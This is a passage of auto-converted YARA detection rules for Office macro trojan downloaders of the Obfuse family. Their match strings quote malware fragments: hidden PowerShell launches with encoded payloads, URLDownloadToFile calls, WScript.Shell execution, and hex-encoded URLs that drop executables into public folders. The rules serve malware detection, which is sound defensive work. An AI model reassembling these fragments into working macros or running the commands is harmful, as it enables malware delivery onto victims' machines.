        $x_1_1 = {53 65 74 20 6f 62 6a 53 68 65 6c 6c 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-64] 28 22 48 41 53 4a 55 48 46 53 41 48 46 53 41 49 4a 55 46 48 53 41 4f 4c 53 41 22 2c 20 28 [0-69] 28 22 [0-36] 22 2c 20 22 36 22 29 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {6f 62 6a 53 68 65 6c 6c 2e 52 75 6e 20 28 [0-75] 29}  //weight: 1, accuracy: Low
        $x_1_3 = "strDataOut = strDataOut + Chr(intXOrValue1 Xor intXOrValue2)" ascii //weight: 1
        $x_1_4 = {4d 69 64 28 [0-60] 2c 20 66 69 72 73 74 2c 20 31 29 20 3d 20 43 68 72 28 41 73 63 28 4d 69 64 28 00 2c 20 66 69 72 73 74 2c 20 31 29 29 20 2d 20 73 65 63 6f 6e 64 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LHH_2147750269_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LHH!MTB"
        threat_id = "2147750269"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "#If VBA7 Then" ascii //weight: 1
        $x_1_2 = "Public Declare PtrSafe Function SetPixel Lib \"gdi32\" (ByVal hDC As LongPtr, ByVal X As LongPtr, ByVal Y As LongPtr," ascii //weight: 1
        $x_1_3 = {48 20 3d 20 48 20 2b 20 [0-32] 20 2a 20 43 6f 73 28 [0-4] 2e [0-21] 20 2b 20 [0-8] 2e [0-21] 20 2a 20 6a 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 57 72 69 74 65 4c 69 6e 65 20 28 [0-21] 2e [0-21] 2e 43 61 70 74 69 6f 6e 29}  //weight: 1, accuracy: Low
        $x_1_5 = {27 45 78 65 63 43 6d 64 20 22 43 3a [0-48] 2e 65 78 65 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SG_2147750276_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SG!MTB"
        threat_id = "2147750276"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {73 61 73 20 3d 20 52 65 70 6c 61 63 65 28 22 6d 03 04 04 03 44 61 74 61 43 6f 64 65 4e 65 74}  //weight: 1, accuracy: Low
        $x_1_2 = {64 61 73 20 3d 20 52 65 70 6c 61 63 65 28 22 53 79 73 74 65 6d [0-112] 2e 65 78 65 53 79 73 74 65 6d [0-46] 22 2c 20 22 53 79 73 74 65 6d 01 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {28 30 2c 20 64 61 73 2c 20 73 61 73 2c 20 30 2c 20 30 29 [0-3] 49 66 20 72 65 74 20 3d 20 30 20 54 68 65 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SG_2147750276_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SG!MTB"
        threat_id = "2147750276"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox" ascii //weight: 1
        $x_1_2 = "For Each p In ActiveWorkbook.BuiltinDocumentProperties" ascii //weight: 1
        $x_1_3 = {53 65 74 20 6f 50 72 6f 63 65 73 73 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 43 65 6c 6c 73 28 [0-2] 2c 20 [0-2] 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = "At(p.Value)" ascii //weight: 1
        $x_1_5 = "Worksheets(1).Activate" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AD_2147750283_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AD!MTB"
        threat_id = "2147750283"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "c = StrComp(\"Sycamore\",y)" ascii //weight: 1
        $x_1_2 = "exec = 'powershell.exe -nop -w Hidden -e" ascii //weight: 1
        $x_1_3 = "AZQArACcAXAAuAHIAaQBjAGsAXwByADAAbABsADMAZAAnACkACgBhAHQAdAByAGkAYgAgACsAaAAgACgAKABHAGUAdAAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAiAC4AXAAiACkALgBGAHUAbABsAE4AYQBtAGUAKwAnAFwALgByAGkAYwBrAF8AcgAwAGwAbAAzAGQAJwApAA==" ascii //weight: 1
        $x_1_4 = "Shell (exec)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PC_2147750322_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PC!MSR"
        threat_id = "2147750322"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= CallByName(CreateObject(Dilnerc(\" Wx Scx rix ptx. xSx hex xll \")), Dilnerc(\"Rx xun\"), Frame1.Zoom - 99, Jilerdo, Frame1.Zoom - 99)" ascii //weight: 1
        $x_1_2 = "= Environ(\"USERPROFILE\") & \"\\\" & Application.Name" ascii //weight: 1
        $x_1_3 = "= Replace(Dilnerc, \"x\", \"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LPB_2147750331_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LPB!MTB"
        threat_id = "2147750331"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 68 72 28 41 73 63 28 4d 69 64 28 53 68 65 65 74 73 28 22 [0-16] 22 29 2e 43 65 6c 6c 73 28 [0-6] 2c 20 [0-3] 29 2e 56 61 6c 75 65 2c 20 73 75 70 65 72 2c 20 [0-3] 29 29 20 2d 20 [0-3] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3c 3d 20 4c 65 6e 28 53 68 65 65 74 73 28 22 [0-16] 22 29 2e 43 65 6c 6c 73 28 [0-6] 2c 20 [0-3] 29 2e 56 61 6c 75 65 29 20 54 68 65 6e}  //weight: 1, accuracy: Low
        $x_1_3 = "GoTo " ascii //weight: 1
        $x_1_4 = "Shell " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SH_2147750341_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SH!MTB"
        threat_id = "2147750341"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox" ascii //weight: 1
        $x_1_2 = "wsh.Exec (StrReverse(Str))" ascii //weight: 1
        $x_1_3 = "Worksheets(1).Activate" ascii //weight: 1
        $x_1_4 = "Set wsh = CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_5 = {3d 20 52 61 6e 67 65 28 22 [0-2] 22 29 2e 43 6f 6d 6d 65 6e 74 2e 54 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SH_2147750341_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SH!MTB"
        threat_id = "2147750341"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "SaveToFile strMalwareFolder & \"\\\" & strMalwareFilename," ascii //weight: 1
        $x_1_2 = ".Open \"GET\", strMalwareUrl, False" ascii //weight: 1
        $x_1_3 = "strMalwareXorKey = malwaresXorKeyRange.Value" ascii //weight: 1
        $x_1_4 = "strMalwareUrl = XorIt(" ascii //weight: 1
        $x_1_5 = "Call Shell(strMalwareFolder & \"\\\" & strMalwareFilename)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SI_2147750342_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SI!MTB"
        threat_id = "2147750342"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox'MsgBox" ascii //weight: 1
        $x_1_2 = ".Exec (StrReverse(Str))" ascii //weight: 1
        $x_1_3 = "Worksheets(1).Activate" ascii //weight: 1
        $x_1_4 = {3d 20 53 74 72 52 65 76 65 72 73 65 28 52 61 6e 67 65 28 22 [0-2] 22 29 2e 43 6f 6d 6d 65 6e 74 2e 54 65 78 74 29}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 4a 6f 69 6e 28 [0-2] 2c 20 22 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SI_2147750342_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SI!MTB"
        threat_id = "2147750342"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {50 75 62 6c 69 63 20 43 6f 6e 73 74 20 [0-5] 20 41 73 20 53 74 72 69 6e 67 20 3d 20 22 20 32 33 72 76 73 67 65 72 22}  //weight: 1, accuracy: Low
        $x_1_2 = "Alias \"URLDownloadToFileA\" (" ascii //weight: 1
        $x_1_3 = "Public Declare Function URLDownloadToFile Lib \"urlmon\"" ascii //weight: 1
        $x_1_4 = "#If VBA7 And Win64 Then" ascii //weight: 1
        $x_1_5 = "= \"h====t====t====p====:====/====/=\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PB_2147750343_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PB!MTB"
        threat_id = "2147750343"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= CreateObject(\"\" + \"\" + \"W\" + \"\" + \"Sc\" + \"\" + \"r\" + \"ip\" + \"\" + \"t\" + \".\" + \"\" + \"S\" + \"h\" + \"el\" + \"\" + \"l\")" ascii //weight: 1
        $x_1_2 = "= \"p\" + \"r\" + \"\" + \"oc\" + \"ex\" + \"\" + \"p\" + \".\" + \"e\" + \"\" + \"x\" + \"e\"" ascii //weight: 1
        $x_1_3 = "= \"w\" + \"\" + \"ir\" + \"\" + \"es\" + \"har\" + \"\" + \"k\" + \".\" + \"ex\" + \"\" + \"e\"" ascii //weight: 1
        $x_1_4 = "+ \".\" + \"\" + \"ex\" + \"\" + \"e\" + \"\"" ascii //weight: 1
        $x_1_5 = {22 53 74 22 20 2b 20 22 22 20 2b 20 22 61 22 20 2b 20 22 72 22 20 2b 20 22 74 22 20 2b 20 22 20 4d 22 20 2b 20 22 65 6e 22 20 2b 20 22 22 20 2b 20 22 75 22 20 2b 20 22 5c 22 20 2b 20 22 50 72 22 20 2b 20 22 22 20 2b 20 22 6f 67 22 20 2b 20 22 72 61 22 20 2b 20 22 6d 73 22 20 2b 20 22 22 20 2b 20 22 5c 22 20 2b 20 22 53 74 22 20 2b 20 22 61 72 22 20 2b 20 22 74 75 22 20 2b 20 22 22 20 2b 20 22 70 22 20 2b 20 22 5c 22 20 2b 20 22 22 22 2b 20 [0-10] 20 2b 22 22 22 20 2b 20 22 22 20 2b 20 22 2e 22 20 2b 20 22 76 62 22 20 2b 20 22 22 20 2b 20 22 73 22 20 2b 20 22 22}  //weight: 1, accuracy: Low
        $x_1_6 = "GetObject(\"\" + \"wi\" + \"\" + \"nm\" + \"gm\" + \"\" + \"ts\" + \":\" + \"/\" + \"/\" & \".\" & \"/\" + \"ro\" + \"\" + \"o\" + \"t\" + \"/\" + \"ci\" + \"\" + \"m\" + \"v2\" + \"\" + \"\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LPC_2147750368_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LPC!MTB"
        threat_id = "2147750368"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 68 72 28 41 73 63 28 4d 69 64 28 53 68 65 65 74 73 28 22 [0-16] 22 29 2e 43 65 6c 6c 73 28 [0-4] 2c 20 [0-3] 29 2e 56 61 6c 75 65 2c 20 [0-16] 2c 20 [0-2] 29 29 20 2d 20 [0-2] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3c 3d 20 4c 65 6e 28 53 68 65 65 74 73 28 22 [0-16] 22 29 2e 43 65 6c 6c 73 28 [0-4] 2c 20 [0-3] 29 2e 56 61 6c 75 65 29 20 54 68 65 6e}  //weight: 1, accuracy: Low
        $x_1_3 = "GoTo " ascii //weight: 1
        $x_1_4 = "Shell " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PD_2147750369_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PD!MSR"
        threat_id = "2147750369"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 [0-16] 4a 4a 43 43 4a 4a [0-16] 68 74 74 70 [0-2] 3a 2f 2f 67 32 63 72 65 64 69 74 73 6f 6c 75 74 69 6f 6e 73 2e 63 6f 6d 2f 74 72 75 73 74 79 2f [0-32] 2e 70 6e 67 [0-16] 63 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 31 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_2 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 [0-16] 4a 4a 43 43 4a 4a [0-16] 68 74 74 70 [0-2] 3a 2f 2f 6c 6f 72 72 61 69 6e 65 68 6f 6d 65 63 6f 6e 73 75 6c 74 69 6e 67 2e 63 6f 6d 2f 77 70 2d 63 6f 6e 74 65 6e 74 2f 75 70 6c 6f 61 64 73 2f [0-32] 2f 74 72 75 73 74 79 2f [0-16] 2e 70 6e 67 [0-5] 63 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 31 2e 65 78 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LHI_2147750552_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LHI!MTB"
        threat_id = "2147750552"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {28 53 68 65 65 74 73 28 22 [0-16] 22 29 2e 43 65 6c 6c 73 28 [0-3] 2c 20 [0-2] 29 2e 56 61 6c 75 65 29 02 00 47 6f 54 6f 20 [0-24] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_2 = {54 72 75 65 02 00 4f 70 74 69 6f 6e 20 45 78 70 6c 69 63 69 74}  //weight: 1, accuracy: Low
        $x_1_3 = "GoTo " ascii //weight: 1
        $x_1_4 = "Shell " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LHJ_2147750572_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LHJ!MTB"
        threat_id = "2147750572"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 74 72 43 6f 6e 76 28 53 68 65 65 74 73 28 22 [0-16] 22 29 2e 43 65 6c 6c 73 28 [0-3] 2c 20 [0-2] 29 2e 56 61 6c 75 65 2c 20 [0-3] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 54 72 75 65 02 00 4f 70 74 69 6f 6e 20 45 78 70 6c 69 63 69 74 02 00 53 75 62 20 57 6f 72 6b 62 6f 6f 6b 5f 4f 70 65 6e 28 29}  //weight: 1, accuracy: Low
        $x_1_3 = "GoTo " ascii //weight: 1
        $x_1_4 = "Shell " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LHK_2147750594_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LHK!MTB"
        threat_id = "2147750594"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 74 72 43 6f 6e 76 28 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 56 61 72 69 61 62 6c 65 73 28 22 [0-32] 22 29 2e 56 61 6c 75 65 2c 20 [0-3] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 53 74 72 43 6f 6e 76 28 53 68 65 65 74 73 28 22 [0-16] 22 29 2e 43 65 6c 6c 73 28 [0-3] 2c 20 [0-2] 29 2e 56 61 6c 75 65 2c 20 [0-3] 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 54 72 75 65 02 00 4f 70 74 69 6f 6e 20 45 78 70 6c 69 63 69 74}  //weight: 1, accuracy: Low
        $x_1_4 = "GoTo " ascii //weight: 1
        $x_1_5 = "Shell " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SK_2147750623_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SK!eml"
        threat_id = "2147750623"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "eml: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = " = Replace(i, \"u\", \"\")" ascii //weight: 1
        $x_2_2 = {20 3d 20 43 61 6c 6c 42 79 4e 61 6d 65 28 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-10] 28 [0-12] 28 22 [0-3] 57 [0-3] 20 53 [0-3] 20 63 72 69 20 70 [0-3] 74 2e 20 [0-3] 53 [0-3] 20 68 65 6c 6c 20 [0-3] [0-3] 22 29 29 29 2c 20 00 28 01 28 22 52 20 20 20 20 20 22 29 29 20 26 20 22 [0-3] 6e 22 2c}  //weight: 2, accuracy: Low
        $x_1_3 = " = Application.StartupPath &" ascii //weight: 1
        $x_1_4 = {28 22 20 6a 20 [0-7] 73 [0-15] 65 22 29 29 3c 00 3d [0-15] 26}  //weight: 1, accuracy: Low
        $x_1_5 = "= Replace(x, \" u\", \"\")" ascii //weight: 1
        $x_1_6 = {26 20 52 65 65 6b 4c 28 22 [0-5] 6a [0-5] 73 65 22 29}  //weight: 1, accuracy: Low
        $x_2_7 = {3d 20 43 61 6c 6c 42 79 4e 61 6d 65 28 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-10] 28 22 [0-3] 57 [0-4] 53 63 [0-5] 72 69 [0-5] 70 74 [0-10] 26 20 22 20 [0-10] 2e 53 68 20 [0-7] 65 6c 20 [0-10] 6c 22 29 29 2c}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((5 of ($x_1_*))) or
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_LHL_2147750636_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LHL!MTB"
        threat_id = "2147750636"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Val(\"&H\" & (Mid$" ascii //weight: 1
        $x_1_2 = {3d 20 41 73 63 28 4d 69 64 24 28 [0-16] 2c}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-3] 28 22 [0-16] 22 2c 20 28 64 65 63 72 79 70 74 28}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 43 68 72 28 41 73 63 28 4d 69 64 28 73 74 72 49 6e 70 75 74 2c 20 [0-96] 2c 20 [0-1] 29 29 20 2d 20 [0-1] 29 [0-21] 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_LHM_2147750733_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.LHM!MTB"
        threat_id = "2147750733"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 65 74 73 28 22 [0-8] 22 29 2e 43 65 6c 6c 73 28 [0-3] 2c 20 [0-2] 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 54 72 75 65 02 00 4f 70 74 69 6f 6e 20 45 78 70 6c 69 63 69 74 02 00 50 75 62 6c 69 63}  //weight: 1, accuracy: Low
        $x_1_3 = "Call Init: Call " ascii //weight: 1
        $x_1_4 = "GoTo " ascii //weight: 1
        $x_1_5 = "Shell " ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_AA_2147750785_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.AA!MTB"
        threat_id = "2147750785"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub autoopen()" ascii //weight: 1
        $x_1_2 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_3 = "Wicmd.CreateFolder \"C:\\pic1\\\"" ascii //weight: 1
        $x_1_4 = "= \"C:\\pic1\\Build16.cmd\"" ascii //weight: 1
        $x_1_5 = {22 73 74 61 72 74 20 63 3a 5c 70 69 63 31 5c 02 07 08 50 72 65 76 69 65 77 50 72 65 76 69 65 77 32 2e 65 78 65 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RS_2147750808_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RS!MTB"
        threat_id = "2147750808"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 74 73 28 22 [0-21] 2f [0-3] 2f [0-3] 2f [0-5] 3b 71 75 75 69 28 29 66 6d 6a 47 65 62 70 6d 6f 78 70 45 2f 2a 75 6f 66 6a 6d 44 63 66 58 2f 75 66 4f 21 75 64 66 6b 63 50 2e 78 66 4f 29 23 23 21 65 6f 62 6e 6e 70 44 2e 21 6d 6d 66 69 74 73 66 78 70 71 22 29 20 27 20 52}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 74 73 28 22 [0-5] 21 55 30 21 5a 21 45 30 21 4f 30 21 5a 21 44 30 21 66 64 6a 70 69 64 21 44 30 21 66 79 66 2f 65 6e 64 5d 33 34 6e 66 75 74 7a 54 5d 74 78 70 65 6f 6a 58 5d 3b 44 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "& ts(\"*(f(!,!(yf/o(!,!(ph(!,!(pmo(!,!(jx]sjeq(!,!(nu](!,!(djm(!,!(cv(!,!(Q]t(!,!(sft(!,!(V](!,!(;D(!-(\")" ascii //weight: 1
        $x_1_4 = "Put #1, , ts(\"##sjeqnu]djmcvQ]tsftV];D##!sjeln!d0!end\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RV_2147750809_0
{
    meta:
        author = "defender2yara"
